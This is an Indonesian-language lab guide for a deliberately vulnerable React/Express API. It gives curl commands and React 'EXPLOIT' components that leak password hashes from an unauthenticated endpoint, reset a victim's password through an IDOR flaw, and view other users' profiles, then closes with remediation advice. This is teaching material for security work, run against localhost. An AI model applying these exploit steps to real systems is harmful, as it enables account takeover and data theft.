# 📋 Panduan Integrasi & Verifikasi Lengkap
## Frontend React.js ↔ Backend Node.js/Express (Vulnerable API)

---

## 🎯 Ringkasan Tujuan
Mengintegrasikan frontend React.js minimalis dengan backend Express yang sengaja rentan, kemudian melakukan verifikasi penuh terhadap 3 kerentanan utama melalui alur eksploitasi nyata.

**Kerentanan yang Akan Diverifikasi:**
1. **Vulnerability 1**: No API Authentication (Data Leak pada `/api/users/all`)
2. **Vulnerability 2**: Broken Authorization/IDOR (Reset Password `/api/users/:id/reset_password`)
3. **Vulnerability 3**: IDOR on Profile View (`GET /api/users/:id`)

---

# FASE 1: PERSIAPAN DAN KONEKSI DASAR

## 1.1 Menjalankan Backend (Node.js/Express)

### Langkah 1: Verifikasi Environment Variables Backend
**Lokasi:** `backend/.env`

Pastikan file `.env` backend berisi konfigurasi berikut:
```env
DATABASE_URL=postgresql://user:password@host/database
JWT_SECRET=your_super_secret_jwt_key_12345
PORT=3001
```

**Penjelasan:**
- `DATABASE_URL`: Connection string ke NeonDB PostgreSQL
- `JWT_SECRET`: Secret key untuk signing/verifying JWT tokens
- `PORT`: Port untuk menjalankan server (default: 3001)

### Langkah 2: Install Dependencies Backend
```bash
cd backend
npm install
```

**Output yang Diharapkan:**
```
added 89 packages in 12s
```

### Langkah 3: Jalankan Backend
```bash
npm start
```

**Output yang Diharapkan:**
```
Server listening on port 3001
Database connected successfully: 2025-12-01T10:30:45.123Z
```

**Verifikasi Koneksi Database:**
- Jika melihat `Database connected successfully`, berarti PostgreSQL terhubung dengan baik
- Jika melihat error, periksa `DATABASE_URL` di `.env`

---

## 1.2 Menjalankan Frontend (React.js/Tailwind CSS)

### Langkah 4: Install Dependencies Frontend
```bash
cd frontend
npm install
```

**Output yang Diharapkan:**
```
added 190 packages in 12s
```

### Langkah 5: Jalankan Frontend
```bash
npm run dev
```

**Output yang Diharapkan:**
```
VITE v7.2.4  ready in 245 ms

➜  Local:   http://localhost:5173/
➜  press h to show help
```

---

## 1.3 Memverifikasi Koneksi Awal (Register & Login)

### Langkah 6: Buka Frontend di Browser
Akses: `http://localhost:5173/`

**Elemen yang Harus Muncul:**
- Navbar dengan menu: "Auth", "Data", "Profile", "Settings"
- Halaman Auth dengan form Register dan Login

### Langkah 7: Daftarkan Akun Korban (Victim Account)

**Di halaman AuthPage:**

**Input Form Register:**
```
Username: victim_user
Email: victim@example.com
Password: victim123456
Full Name: Victim User
```

**Klik tombol:** "Register"

**Output yang Diharapkan:**
```json
{
  "message": "User registered successfully. Please login.",
  "user": {
    "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
    "username": "victim_user",
    "email": "victim@example.com"
  }
}
```

**CATAT DATA PENTING (untuk Fase 2 & 3):**
- **Victim UUID**: `a1b2c3d4-e5f6-7890-abcd-ef1234567890`
- **Victim Username**: `victim_user`
- **Victim Email**: `victim@example.com`

---

### Langkah 8: Login dengan Akun Korban

**Di halaman AuthPage:**

**Input Form Login:**
```
Username: victim_user
Password: victim123456
```

**Klik tombol:** "Login"

**Output yang Diharapkan:**
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
}
```

**CATAT DATA PENTING (untuk Fase 3):**
- **Victim JWT Token**: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` (seluruh token)
- Status: ✅ Koneksi backend ↔ frontend berhasil

---

### Langkah 9: Daftarkan Akun Penyerang (Attacker Account)

**Ulangi Langkah 7-8 dengan data berbeda:**

**Input Form Register:**
```
Username: attacker_user
Email: attacker@example.com
Password: attacker123456
Full Name: Attacker User
```

**CATAT DATA PENTING:**
- **Attacker UUID**: `x1y2z3a4-b5c6-7890-abcd-ef1234567890`
- **Attacker Username**: `attacker_user`

**Login untuk mendapatkan Attacker JWT Token:**
```
Username: attacker_user
Password: attacker123456
```

**CATAT:**
- **Attacker JWT Token**: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` (token penyerang)

---

## 1.4 Tabel Referensi Data

| Item | Nilai | Keterangan |
|------|-------|-----------|
| Backend URL | `http://localhost:3001` | API Server |
| Frontend URL | `http://localhost:5173` | React App |
| Victim UUID | `a1b2c3d4-...` | ID Korban (dari Langkah 7) |
| Victim JWT | `eyJhbGc...` | Token Korban (dari Langkah 8) |
| Attacker UUID | `x1y2z3a4-...` | ID Penyerang (dari Langkah 9) |
| Attacker JWT | `eyJhbGc...` | Token Penyerang (dari Langkah 9) |

---

# FASE 2: VERIFIKASI KERENTANAN 1 (NO API AUTH / DATA LEAK)

## 2.1 Penjelasan Kerentanan

**Kerentanan:** Endpoint `/api/users/all` tidak memiliki middleware `authenticateToken`.

**Dampak:**
- Siapa pun (tanpa token) dapat mengakses daftar semua pengguna
- Data sensitif terpapar: `password_hash`, `email`, `is_admin`

**Endpoint Target:**
```
GET http://localhost:3001/api/users/all
Header Authorization: TIDAK DIPERLUKAN
```

---

## 2.2 Menguji dengan Postman/cURL

### Opsi A: Menggunakan cURL di Terminal

**Command:**
```bash
curl -X GET "http://localhost:3001/api/users/all" \
  -H "Content-Type: application/json"
```

**Output yang Diharapkan (tanpa error 401/403):**
```json
[
  {
    "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
    "username": "victim_user",
    "email": "victim@example.com",
    "full_name": "Victim User",
    "is_admin": false,
    "created_at": "2025-12-01T10:35:12.123Z",
    "password_hash": "$2b$05$abcd1234..."  ⚠️ SENSITIVE DATA LEAK!
  },
  {
    "id": "x1y2z3a4-b5c6-7890-abcd-ef1234567890",
    "username": "attacker_user",
    "email": "attacker@example.com",
    "full_name": "Attacker User",
    "is_admin": false,
    "created_at": "2025-12-01T10:36:15.456Z",
    "password_hash": "$2b$05$xyz9876..."  ⚠️ SENSITIVE DATA LEAK!
  }
]
```

---

### Opsi B: Menggunakan Frontend (Membuat Komponen Test)

**Di `frontend/src/pages/UserListPage.jsx`, modifikasi untuk test:**

```jsx
import { useEffect, useState } from 'react';
import axios from 'axios';

export default function UserListPage() {
  const [users, setUsers] = useState([]);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchAllUsers = async () => {
      try {
        // ⚠️ TESTING: Panggil tanpa token (No Auth)
        const response = await axios.get(
          'http://localhost:3001/api/users/all'
        );
        setUsers(response.data);
      } catch (err) {
        setError(err.response?.data?.error || err.message);
      }
    };
    fetchAllUsers();
  }, []);

  return (
    <div className="space-y-4">
      <h1 className="text-2xl font-bold">All System Users (No Auth)</h1>
      
      {error && (
        <div className="bg-red-900 text-red-100 p-4 rounded">
          Error: {error}
        </div>
      )}
      
      <div className="overflow-x-auto">
        <table className="w-full border border-gray-700">
          <thead className="bg-gray-800">
            <tr>
              <th className="px-4 py-2">UUID</th>
              <th className="px-4 py-2">Username</th>
              <th className="px-4 py-2">Email</th>
              <th className="px-4 py-2">Password Hash</th>
              <th className="px-4 py-2">Admin</th>
            </tr>
          </thead>
          <tbody>
            {users.map((user) => (
              <tr key={user.id} className="border-t border-gray-700">
                <td className="px-4 py-2 text-xs">{user.id}</td>
                <td className="px-4 py-2">{user.username}</td>
                <td className="px-4 py-2">{user.email}</td>
                <td className="px-4 py-2 text-xs truncate">{user.password_hash}</td>
                <td className="px-4 py-2">{user.is_admin ? 'Yes' : 'No'}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
```

**Klik tombol "Data" di navbar → Lihat daftar semua user + password hash mereka**

---

## 2.3 Verifikasi Kerentanan 1 ✅

**Checklist:**
- [ ] Endpoint `/api/users/all` mengembalikan respons 200 (bukan 401/403)
- [ ] Data termasuk `password_hash` (bukti data sensitif terekspos)
- [ ] Frontend berhasil menampilkan tabel dengan informasi semua pengguna
- [ ] **Kesimpulan**: Kerentanan 1 TERBUKTI - Tidak ada autentikasi pada `/api/users/all`

---

# FASE 3: VERIFIKASI KERENTANAN 2 (BROKEN AUTHORIZATION / IDOR RESET PASSWORD)

## 3.1 Penjelasan Kerentanan

**Kerentanan:** Endpoint `POST /api/users/:id/reset_password` memiliki middleware `authenticateToken`, TETAPI tidak memverifikasi apakah `targetId` (dari URL) sama dengan `req.user.id` (dari token).

**Dampak:**
- Penyerang (dengan token valid mereka sendiri) dapat mereset password akun korban
- Akses kontrol berbasis URL parameter tanpa validasi otorisasi

**Endpoint Target:**
```
POST http://localhost:3001/api/users/:id/reset_password
Header Authorization: Bearer <ATTACKER_JWT_TOKEN>
Body: { "new_password": "hacked123456" }
```

**Contoh Eksploitasi:**
```
URL: http://localhost:3001/api/users/a1b2c3d4-e5f6-7890-abcd-ef1234567890/reset_password
(menggunakan Victim UUID dari Fase 1, Langkah 7)

Header:
  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... (ATTACKER TOKEN)

Body:
  { "new_password": "hacked123456" }
```

---

## 3.2 Menguji dengan Postman/cURL

### Opsi A: Menggunakan cURL di Terminal

**Command:**
```bash
curl -X POST "http://localhost:3001/api/users/a1b2c3d4-e5f6-7890-abcd-ef1234567890/reset_password" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -H "Content-Type: application/json" \
  -d '{"new_password":"hacked123456"}'
```

**Catatan:**
- Ganti `a1b2c3d4-...` dengan **Victim UUID** dari Fase 1, Langkah 7
- Ganti `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` dengan **Attacker JWT Token** dari Fase 1, Langkah 9

**Output yang Diharapkan (jika rentan):**
```json
{
  "message": "Password for user ID a1b2c3d4-e5f6-7890-abcd-ef1234567890 updated successfully.",
  "debug_info": "Request made by user ID: x1y2z3a4-b5c6-7890-abcd-ef1234567890"
}
```

**Status**: ✅ Status 200 (berhasil) = Kerentanan TERBUKTI

---

### Opsi B: Menggunakan Frontend (Membuat Komponen Test)

**Di `frontend/src/pages/AccountSettingsPage.jsx`, modifikasi untuk test:**

```jsx
import { useState } from 'react';
import axios from 'axios';

export default function AccountSettingsPage() {
  const [targetUserId, setTargetUserId] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [result, setResult] = useState(null);
  const [error, setError] = useState(null);

  const handleResetPasswordIDOR = async (e) => {
    e.preventDefault();
    try {
      // Ambil token dari localStorage (token penyerang)
      const token = localStorage.getItem('token');
      
      if (!token) {
        setError('Token tidak ditemukan. Silakan login terlebih dahulu.');
        return;
      }

      // ⚠️ EXPLOIT: Menggunakan token penyerang untuk mereset password korban
      const response = await axios.post(
        `http://localhost:3001/api/users/${targetUserId}/reset_password`,
        { new_password: newPassword },
        {
          headers: {
            Authorization: `Bearer ${token}`,
            'Content-Type': 'application/json',
          },
        }
      );

      setResult({
        status: 'success',
        data: response.data,
      });
      setError(null);
    } catch (err) {
      setError(err.response?.data?.error || err.message);
      setResult(null);
    }
  };

  return (
    <div className="max-w-md mx-auto space-y-6">
      <h1 className="text-2xl font-bold">IDOR Reset Password Test</h1>

      <form onSubmit={handleResetPasswordIDOR} className="space-y-4">
        <div>
          <label className="block text-sm font-medium">Target User UUID</label>
          <input
            type="text"
            value={targetUserId}
            onChange={(e) => setTargetUserId(e.target.value)}
            placeholder="Masukkan UUID korban (dari Fase 1)"
            className="w-full px-3 py-2 bg-gray-800 border border-gray-600 rounded text-white"
          />
        </div>

        <div>
          <label className="block text-sm font-medium">New Password</label>
          <input
            type="password"
            value={newPassword}
            onChange={(e) => setNewPassword(e.target.value)}
            placeholder="Password baru untuk korban"
            className="w-full px-3 py-2 bg-gray-800 border border-gray-600 rounded text-white"
          />
        </div>

        <button
          type="submit"
          className="w-full px-4 py-2 bg-red-600 hover:bg-red-700 rounded font-bold"
        >
          EXPLOIT: Reset Korban Password
        </button>
      </form>

      {error && (
        <div className="bg-red-900 text-red-100 p-4 rounded">
          ❌ Error: {error}
        </div>
      )}

      {result?.status === 'success' && (
        <div className="bg-green-900 text-green-100 p-4 rounded">
          ✅ EXPLOIT BERHASIL! <br />
          {JSON.stringify(result.data, null, 2)}
        </div>
      )}
    </div>
  );
}
```

**Langkah Pengujian di Frontend:**

1. **Login sebagai Penyerang**
   - Username: `attacker_user`
   - Password: `attacker123456`
   - Token penyerang disimpan di `localStorage`

2. **Pergi ke halaman "Settings"** (AccountSettingsPage)

3. **Input:**
   - Target User UUID: `a1b2c3d4-e5f6-7890-abcd-ef1234567890` (Victim UUID)
   - New Password: `hacked123456`

4. **Klik "EXPLOIT: Reset Korban Password"**

5. **Output yang Diharapkan:**
   ```json
   {
     "message": "Password for user ID a1b2c3d4-e5f6-7890-abcd-ef1234567890 updated successfully.",
     "debug_info": "Request made by user ID: x1y2z3a4-b5c6-7890-abcd-ef1234567890"
   }
   ```

---

## 3.3 Verifikasi Kerentanan 2 - Langkah Lanjutan (Membuktikan Password Berubah)

### Langkah 1: Logout dari Akun Penyerang
Klik logout atau bersihkan token.

### Langkah 2: Coba Login dengan Akun Korban (Credential Lama)

**Input:**
```
Username: victim_user
Password: victim123456  (password lama)
```

**Output yang Diharapkan:**
```json
{
  "error": "Invalid credentials"
}
```

**Status**: ❌ Login GAGAL (karena password sudah berubah)

---

### Langkah 3: Coba Login dengan Akun Korban (Credential Baru - Dari Exploit)

**Input:**
```
Username: victim_user
Password: hacked123456  (password baru dari exploit)
```

**Output yang Diharapkan:**
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
}
```

**Status**: ✅ Login BERHASIL (membuktikan password benar-benar berubah)

---

## 3.4 Verifikasi Kerentanan 2 ✅

**Checklist:**
- [ ] Endpoint `/api/users/:id/reset_password` mengembalikan respons 200
- [ ] Response berisi debug_info dengan ID penyerang (berbeda dari target)
- [ ] Password korban benar-benar berubah (dapat login dengan password baru)
- [ ] Password lama tidak lagi berfungsi
- [ ] **Kesimpulan**: Kerentanan 2 TERBUKTI - Broken Authorization/IDOR pada reset password

---

# FASE 4: VERIFIKASI KERENTANAN 3 (IDOR ON PROFILE VIEW)

## 4.1 Penjelasan Kerentanan

**Kerentanan:** Endpoint `GET /api/users/:id` memiliki middleware `authenticateToken`, TETAPI tidak memverifikasi apakah `targetId` (dari URL) sama dengan `req.user.id` (dari token).

**Dampak:**
- Penyerang (dengan token valid) dapat melihat profil akun pengguna lain
- Mengakses informasi pribadi seperti email, full_name, admin status

**Endpoint Target:**
```
GET http://localhost:3001/api/users/:id
Header Authorization: Bearer <ANY_VALID_JWT_TOKEN>
```

---

## 4.2 Menguji dengan Postman/cURL

### Opsi A: Menggunakan cURL di Terminal

**Command:**
```bash
curl -X GET "http://localhost:3001/api/users/a1b2c3d4-e5f6-7890-abcd-ef1234567890" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -H "Content-Type: application/json"
```

**Catatan:**
- Ganti `a1b2c3d4-...` dengan **Victim UUID** (ID orang lain yang ingin dilihat)
- Ganti `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` dengan **Attacker JWT Token** (token penyerang)

**Output yang Diharapkan (jika rentan):**
```json
{
  "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "username": "victim_user",
  "email": "victim@example.com",
  "full_name": "Victim User",
  "is_admin": false,
  "created_at": "2025-12-01T10:35:12.123Z"
}
```

**Status**: ✅ Status 200 (berhasil akses profil orang lain) = Kerentanan TERBUKTI

---

### Opsi B: Menggunakan Frontend (Membuat Komponen Test)

**Di `frontend/src/pages/ProfilePage.jsx`, modifikasi untuk test:**

```jsx
import { useState } from 'react';
import axios from 'axios';

export default function ProfilePage() {
  const [targetUserId, setTargetUserId] = useState('');
  const [profile, setProfile] = useState(null);
  const [error, setError] = useState(null);

  const handleViewProfileIDOR = async (e) => {
    e.preventDefault();
    try {
      // Ambil token dari localStorage (token penyerang)
      const token = localStorage.getItem('token');
      
      if (!token) {
        setError('Token tidak ditemukan. Silakan login terlebih dahulu.');
        return;
      }

      // ⚠️ EXPLOIT: Menggunakan token penyerang untuk melihat profil korban
      const response = await axios.get(
        `http://localhost:3001/api/users/${targetUserId}`,
        {
          headers: {
            Authorization: `Bearer ${token}`,
            'Content-Type': 'application/json',
          },
        }
      );

      setProfile(response.data);
      setError(null);
    } catch (err) {
      setError(err.response?.data?.error || err.message);
      setProfile(null);
    }
  };

  return (
    <div className="max-w-md mx-auto space-y-6">
      <h1 className="text-2xl font-bold">IDOR Profile View Test</h1>

      <form onSubmit={handleViewProfileIDOR} className="space-y-4">
        <div>
          <label className="block text-sm font-medium">Target User UUID</label>
          <input
            type="text"
            value={targetUserId}
            onChange={(e) => setTargetUserId(e.target.value)}
            placeholder="Masukkan UUID pengguna yang ingin dilihat"
            className="w-full px-3 py-2 bg-gray-800 border border-gray-600 rounded text-white"
          />
        </div>

        <button
          type="submit"
          className="w-full px-4 py-2 bg-orange-600 hover:bg-orange-700 rounded font-bold"
        >
          EXPLOIT: View Korban Profile
        </button>
      </form>

      {error && (
        <div className="bg-red-900 text-red-100 p-4 rounded">
          ❌ Error: {error}
        </div>
      )}

      {profile && (
        <div className="bg-green-900 text-green-100 p-4 rounded space-y-2">
          <h2 className="font-bold">✅ Profile Data (IDOR Exploit Berhasil)</h2>
          <p><strong>UUID:</strong> {profile.id}</p>
          <p><strong>Username:</strong> {profile.username}</p>
          <p><strong>Email:</strong> {profile.email}</p>
          <p><strong>Full Name:</strong> {profile.full_name}</p>
          <p><strong>Admin:</strong> {profile.is_admin ? 'Yes' : 'No'}</p>
          <p><strong>Created:</strong> {profile.created_at}</p>
        </div>
      )}
    </div>
  );
}
```

**Langkah Pengujian di Frontend:**

1. **Login sebagai Penyerang**
   - Username: `attacker_user`
   - Password: `attacker123456`

2. **Pergi ke halaman "Profile"** (ProfilePage)

3. **Input:**
   - Target User UUID: `a1b2c3d4-e5f6-7890-abcd-ef1234567890` (Victim UUID)

4. **Klik "EXPLOIT: View Korban Profile"**

5. **Output yang Diharapkan:**
   ```json
   {
     "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
     "username": "victim_user",
     "email": "victim@example.com",
     "full_name": "Victim User",
     "is_admin": false,
     "created_at": "2025-12-01T10:35:12.123Z"
   }
   ```

---

## 4.3 Verifikasi Kerentanan 3 ✅

**Checklist:**
- [ ] Endpoint `/api/users/:id` mengembalikan respons 200
- [ ] Penyerang dapat melihat profil pengguna lain (bukan dirinya sendiri)
- [ ] Frontend berhasil menampilkan data profil korban
- [ ] **Kesimpulan**: Kerentanan 3 TERBUKTI - IDOR pada profile view

---

# RINGKASAN VERIFIKASI & HASIL AKHIR

## Tabel Ringkasan Kerentanan

| No | Kerentanan | Endpoint | Method | Auth | Status | Bukti |
|---|---|---|---|---|---|---|
| 1 | No API Auth (Data Leak) | `/api/users/all` | GET | ❌ TIDAK | ✅ TERBUKTI | Daftar user + password hash terekspos |
| 2 | Broken Authorization/IDOR | `/api/users/:id/reset_password` | POST | ✅ YA (tapi tidak ada authz check) | ✅ TERBUKTI | Password korban berubah via token penyerang |
| 3 | IDOR Profile View | `/api/users/:id` | GET | ✅ YA (tapi tidak ada authz check) | ✅ TERBUKTI | Penyerang dapat melihat profil korban |

---

## Diagram Alur Eksploitasi Lengkap

```
┌─────────────────────────────────────────────────────────────────┐
│                    FASE 1: PERSIAPAN                            │
├─────────────────────────────────────────────────────────────────┤
│ 1. Jalankan Backend (http://localhost:3001)                    │
│ 2. Jalankan Frontend (http://localhost:5173)                   │
│ 3. Register Victim User → Dapatkan Victim UUID & JWT           │
│ 4. Register Attacker User → Dapatkan Attacker UUID & JWT       │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│            FASE 2: VULNERABILITY 1 (DATA LEAK)                  │
├─────────────────────────────────────────────────────────────────┤
│ Request: GET /api/users/all (tanpa token)                      │
│ Response: 200 OK + Daftar semua user + password hash           │
│ ✅ Kerentanan TERBUKTI                                          │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│        FASE 3: VULNERABILITY 2 (IDOR RESET PASSWORD)           │
├─────────────────────────────────────────────────────────────────┤
│ Attacker Login → Dapatkan Attacker JWT                         │
│ Request: POST /api/users/{VICTIM_UUID}/reset_password          │
│          Header: Authorization: Bearer {ATTACKER_JWT}          │
│          Body: {"new_password": "hacked123456"}                │
│ Response: 200 OK "Password updated successfully"               │
│ ✅ Kerentanan TERBUKTI (Victim password benar-benar berubah)   │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│         FASE 4: VULNERABILITY 3 (IDOR PROFILE VIEW)            │
├─────────────────────────────────────────────────────────────────┤
│ Attacker Login → Dapatkan Attacker JWT                         │
│ Request: GET /api/users/{VICTIM_UUID}                          │
│          Header: Authorization: Bearer {ATTACKER_JWT}          │
│ Response: 200 OK + Victim Profile Data                         │
│ ✅ Kerentanan TERBUKTI (Attacker dapat lihat data korban)      │
└─────────────────────────────────────────────────────────────────┘
```

---

## Checklist Verifikasi Final ✅

### Backend
- [ ] Backend berjalan di port 3001
- [ ] Database terkoneksi (PostgreSQL/NeonDB)
- [ ] CORS dikonfigurasi (`app.use(cors())`)
- [ ] JWT authentication berfungsi
- [ ] Ketiga endpoint rentan dapat diakses sesuai ekspektasi

### Frontend
- [ ] Frontend berjalan di port 5173
- [ ] Navbar navigasi berfungsi (Auth, Data, Profile, Settings)
- [ ] Form Register & Login berfungsi
- [ ] Data token tersimpan di `localStorage`
- [ ] Axios requests ke backend berhasil

### Kerentanan 1 (Data Leak)
- [ ] `/api/users/all` dapat diakses tanpa token
- [ ] Response berisi password_hash (data sensitif)
- [ ] Frontend dapat menampilkan daftar user

### Kerentanan 2 (IDOR Reset Password)
- [ ] Attacker dapat reset password korban
- [ ] Response status 200 (berhasil)
- [ ] Password korban benar-benar berubah (verifikasi login dengan password baru)

### Kerentanan 3 (IDOR Profile View)
- [ ] Attacker dapat view profil korban
- [ ] Response status 200 dengan data korban
- [ ] Attacker dapat melihat email, full_name, admin status korban

---

## 🎓 Kesimpulan Pembelajaran

**Kerentanan yang Dipelajari:**
1. ✅ **Broken Authentication/No Auth**: Endpoint tanpa middleware `authenticateToken`
2. ✅ **Broken Authorization (IDOR)**: Middleware ada, tapi tidak ada validasi otorisasi (`req.user.id !== targetId`)
3. ✅ **Insecure Direct Object References**: Parameter dari URL bisa dimanipulasi tanpa validasi

**Implikasi Keamanan:**
- Selalu validasi JWT token di header Authorization
- Selalu verifikasi bahwa user yang request adalah owner dari resource yang diminta
- Jangan percaya parameter dari URL/request body untuk operasi sensitif
- Gunakan ownership check: `if (req.user.id !== req.params.id) return 403`

---

## 📚 Referensi & Dokumentasi

- **OWASP Top 10**: A01:2021 – Broken Access Control
- **CWE-639**: Authorization Bypass Through User-Controlled Key
- **Express CORS**: https://expressjs.com/en/resources/middleware/cors.html
- **JWT.io**: https://jwt.io/
- **Axios Documentation**: https://axios-http.com/

---

**Versi Dokumen**: 1.0  
**Tanggal**: 1 Desember 2025  
**Status**: Lengkap ✅
